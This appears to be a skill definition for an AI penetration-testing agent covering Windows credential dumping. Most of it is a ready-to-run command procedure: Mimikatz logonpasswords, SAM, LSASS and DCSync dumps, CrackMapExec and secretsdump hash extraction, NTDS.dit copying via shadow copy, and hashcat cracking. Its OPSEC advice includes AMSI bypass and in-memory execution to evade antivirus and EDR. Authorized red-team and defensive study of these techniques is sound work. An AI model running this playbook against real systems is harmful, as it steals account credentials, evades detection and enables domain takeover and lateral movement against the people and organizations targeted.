---
name: credential-dump-windows
description: Dump password hashes from Windows systems (lsass, SAM, NTDS)
version: 1.0.0
phase: post
category: post-exploitation
tags: [windows, credentials, mimikatz, hashes, lsass, ntds]
tools: [mimikatz, crackmapexec, secretsdump]
difficulty: advanced
opsec_level: high
time_estimate: 5m
severity_if_found: critical
related_skills:
  - credential-harvest
  - lateral-movement
mitre_attack:
  - T1003.001
  - T1003.003
  - T1003.002
---

## When to Use

Use this skill on compromised Windows systems to extract password hashes,
Kerberos tickets, and plaintext credentials. Common targets: lsass.exe,
SAM database, NTDS.dit (domain controllers).

## Prerequisites

- Administrator or SYSTEM privileges on target
- mimikatz, crackmapexec, or secretsdump
- Sufficient disk space for NTDS.dit (~GB)

## Procedure

```bash
# 1. Check current privileges
whoami /all
net user

# 2. Mimikatz — dump all credentials (requires SYSTEM)
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# 3. Mimikatz — dump SAM database
mimikatz.exe "privilege::debug" "lsadump::sam" "exit"

# 4. Mimikatz — dump LSASS (requires SYSTEM)
mimikatz.exe "privilege::debug" "sekurlsa::minidump lsass.dmp" "sekurlsa::minidump lsass.dmp" "exit"

# 5. CrackMapExec — extract SAM hashes
crackmapexec smb TARGET -u admin -p pass --sam
crackmapexec smb TARGET -u admin -p pass --lsa

# 6. Secretsdump (Impacket) — remote dump
secretsdump.py DOMAIN/user:password@TARGET
secretsdump.py -just-dc-ntlm DOMAIN/domain-admin:password@DC_IP

# 7. NTDS.dit extraction (Domain Controller)
# Option A: Volume shadow copy
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\

# Option B: DCSync with mimikatz
mimikatz.exe "privilege::debug" "lsadump::dcsync /user:krbtgt" "exit"

# 8. Crack NTLM hashes with hashcat
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

## OPSEC Rules

- **CRITICAL**: Credential dumping is extremely noisy — triggers AV and EDR
- Use Mimikatz with AMSI bypass or in-memory execution
- Minimize dump size — target specific users when possible
- NTDS.dit extraction requires DC access — document carefully
- Do not attempt on production DCs without explicit authorization
- Clean up all dumped files after assessment

## Verification

- Confirm hash format is correct (NTLM, Kerberos)
- Test pass-the-hash with cracked credentials
- Verify extracted hashes work for authentication
- Check if Credential Guard blocks extraction

## Pitfalls

- Credential Guard prevents lsass memory access
- AMSI detects Mimikatz in real-time
- EDR may quarantine Mimikatz execution
- NTDS.dit requires significant disk space
- Some hashes may be NTLM-only (no plaintext)
- Protected Users group cannot be credential-dumped

## Output Format

```
[CRED-DUMP] Windows credentials extracted
  Method: Mimikatz sekurlsa
  Target: web-server (10.0.1.10)
  Users found: 3
  Administrator: NTLM=aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
  Severity: CRITICAL

[CRED-DUMP] SAM dump successful
  Method: CrackMapExec --sam
  Hashes extracted: 8
  Severity: CRITICAL
```
